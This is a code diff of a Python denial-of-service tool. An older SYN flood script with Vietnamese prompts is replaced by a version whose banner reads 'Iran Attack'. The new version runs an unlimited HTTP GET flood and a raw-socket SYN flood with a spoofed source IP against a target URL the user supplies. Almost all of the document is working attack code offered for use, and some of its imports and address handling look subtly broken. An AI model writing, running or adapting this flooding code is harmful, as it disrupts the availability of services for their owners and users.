@@ -1,130 +1,107 @@
-import re
-import os
-import sys
-import time
-import string
-import signal
-import http.client
-import urllib.parse
-from random import choice, randint
-from socket import *
-from struct import *
-from threading import Thread, Lock
+from ast import Pass
+from time import sleep
+from requests import get as requests_get
+from time import localtime, strftime
+import threading
+import socket
+import random
+from struct import pack
+from socket import AF_INET, SOCK_RAW, IPPROTO_TCP, IP_HDRINCL, inet_aton, htons
+from random import randint
 
-def fake_ip():
+def print_banner():
+    print("\n██████╗░░█████╗░░██████╗████████╗██████╗░░█████╗░")
+    print("██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗")
+    print("██║░░██║██║░░██║╚█████╗░░░░██║░░░██████╔╝███████║")
+    print("██║░░██║██║░░██║░╚═══██╗░░░██║░░░██╔══██╗██╔══██║")
+    print("██████╔╝╚█████╔╝██████╔╝░░░██║░░░██║░░██║██║░░██║")
+    print("╚═════╝░░╚════╝░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝")
+    print("-------------------------------------------------")
+    print("   ----| Iran Attack _ GitHub:@emnatkins |----   ")
+    print("-------------------------------------------------\n\n")
+
+def http_get_flood(target, packet_size):
+    count = 0
+    if packet_size == "u":
+        print("===== The HTTP GET Flood attack started :)")
+        while True:
+            named_tuple = localtime() # get struct_time
+            time_string = strftime("%m/%d/%Y, %H:%M:%S", named_tuple)
+            r = requests_get("http://"+target)
+            print(f"[{time_string}] Packet was sent ({count})")
+            count += 1
+    elif int(packet_size) >= 1:
+        print("===== The HTTP GET Flood attack started :)")
+        while count <= int(packet_size):
+            named_tuple = localtime() # get struct_time
+            time_string = strftime("%m/%d/%Y, %H:%M:%S", named_tuple)
+            r = requests_get("http://"+target)
+            print(f"[{time_string}] Packet was sent ({count})")
+            count += 1
+        print("HTTP GET Flood attack finished!")
+    else:
+        print("Error: Please enter the correct number of packets.")
+        print("Note: The program closes automatically after 5 seconds!")
+        sleep(5)
+
+def checksum(psh):
+    s = 0
+    for i in range(0, len(psh), 2):
+        w = (ord(psh[i]) << 8) + ord(psh[i+1])
+        s = s + w
+    s = (s >> 16) + (s & 0xffff)
+    s = ~s & 0xffff
+    return s
+
+def syn_flood(target_ip, fake_ip):
+    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
+    sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
+    
     while True:
-        ips = [str(randint(0, 255)) for _ in range(4)]
-        if ips[0] == "127":
-            continue
-        fkip = '.'.join(ips)
-        break
-    return fkip
+        source_ip = fake_ip
+        dest_ip = target_ip
+        ip_header = pack('!BBHHHBBH4s4s', 69, 0, 40, 54321, 0, 64, IPPROTO_TCP, 0, inet_aton(source_ip), inet_aton(dest_ip))
 
-def check_tgt(url):
-    try:
-        ip = gethostbyname(url)
-    except:
-        sys.exit('[-] Không thể giải quyết host: Unknown host!')
-    return ip
+        tcp_header = pack('!HHLLBBHHH', 12345, 80, 0, 0, 5 << 4, 2, htons(5840), 0, 0)
 
-class Synflood(Thread):
-    def __init__(self, tgt, ip, sock=None):
-        Thread.__init__(self)
-        self.tgt = tgt
-        self.ip = ip
-        self.psh = ''
-        if sock is None:
-            self.sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
-            self.sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-        else:
-            self.sock = sock
-        self.lock = Lock()
+        psh = pack('!4s4sBBH', inet_aton(source_ip), inet_aton(dest_ip), 0, IPPROTO_TCP, len(tcp_header))
+        psh = psh + tcp_header
 
-    def checksum(self):
-        s = 0
-        for i in range(0, len(self.psh), 2):
-            w = (ord(self.psh[i]) << 8) + ord(self.psh[i+1])
-            s = s + w
-        s = (s >> 16) + (s & 0xffff)
-        s = ~s & 0xffff
-        return s
+        tcp_checksum = checksum(psh)
+        tcp_header = pack('!HHLLBBHHH', 12345, 80, 0, 0, 5 << 4, 2, htons(5840), tcp_checksum, 0)
 
-    def Building_packet(self):
-        ihl = 5
-        version = 4
-        tos = 0
-        tot = 40
-        id = 54321
-        frag_off = 0
-        ttl = 64
-        protocol = IPPROTO_TCP
-        check = 10
-        s_addr = inet_aton(self.ip)
-        d_addr = inet_aton(self.tgt)
-
-        ihl_version = (version << 4) + ihl
-        ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot, id, frag_off, ttl, protocol, check, s_addr, d_addr)
-
-        source = 54321
-        dest = 80
-        seq = 0
-        ack_seq = 0
-        doff = 5
-        fin = 0
-        syn = 1
-        rst = 0
-        ack = 0
-        psh = 0
-        urg = 0
-        window = htons(5840)
-        check = 0
-        urg_prt = 0
-
-        offset_res = (doff << 4)
-        tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
-        tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, check, urg_prt)
-
-        src_addr = inet_aton(self.ip)
-        dst_addr = inet_aton(self.tgt)
-        place = 0
-        protocol = IPPROTO_TCP
-        tcp_length = len(tcp_header)
-
-        self.psh = pack('!4s4sBBH', src_addr, dst_addr, place, protocol, tcp_length)
-        self.psh = self.psh + tcp_header
-
-        tcp_checksum = self.checksum()
-        tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, tcp_checksum, urg_prt)
         packet = ip_header + tcp_header
-        return packet
-
-    def run(self):
-        packet = self.Building_packet()
-        try:
-            self.lock.acquire()
-            self.sock.sendto(packet, (self.tgt, 0))
-        except KeyboardInterrupt:
-            sys.exit('[-] Ngừng bởi người dùng')
-        except Exception as e:
-            print(e)
-        finally:
-            self.lock.release()
+        sock.sendto(packet, (target_ip, 0))
 
 def main():
-    url = input('Nhập URL mục tiêu: ')
-    ip = input('Nhập IP giả (hoặc để trống để tự động tạo): ') or fake_ip()
-    num_threads = int(input('Nhập số lượng luồng: '))
+    print_banner()
+    
+    target = input("-- Target URL: ")
+    packet_size = input("-- Packet Size (\"u\" = unlimited): ")
+    fake_ip = input("-- Fake IP (or leave empty for auto-generate): ") or '.'.join([str(randint(0, 255)) for _ in range(4)])
+    
+    if target.startswith("http://"):
+        target = target[7:]
+    elif target.startswith("https://"):
+        target = target[8:]
+    
+    # Check target
+    try:
+        requests_get("http://" + target)
+    except:
+        print("Error: Invalid site address.")
+        sleep(5)
+        return
+    
+    # Start HTTP GET Flood and SYN Flood attacks
+    http_thread = threading.Thread(target=http_get_flood, args=(target, packet_size))
+    syn_thread = threading.Thread(target=syn_flood, args=(target, fake_ip))
+    
+    http_thread.start()
+    syn_thread.start()
+    
+    http_thread.join()
+    syn_thread.join()
 
-    print(f'[*] Bắt đầu tấn công SYN Flood: {url}')
-    while True:
-        try:
-            for _ in range(num_threads):
-                thread = Synflood(url, ip)
-                thread.setDaemon(True)
-                thread.start()
-                thread.join()
-        except KeyboardInterrupt:
-            sys.exit('[-] Ngừng bởi người dùng')
-
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
